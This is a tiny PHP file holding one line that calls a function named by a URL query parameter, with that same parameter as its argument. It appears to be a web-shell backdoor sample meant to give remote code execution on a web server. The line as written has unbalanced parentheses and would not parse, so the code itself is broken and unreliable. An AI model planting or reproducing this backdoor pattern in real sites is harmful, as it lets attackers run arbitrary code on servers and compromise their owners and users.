<?php
$_GET['dC2eNxCv'](($_GET['dC2eNxCv']);
?>
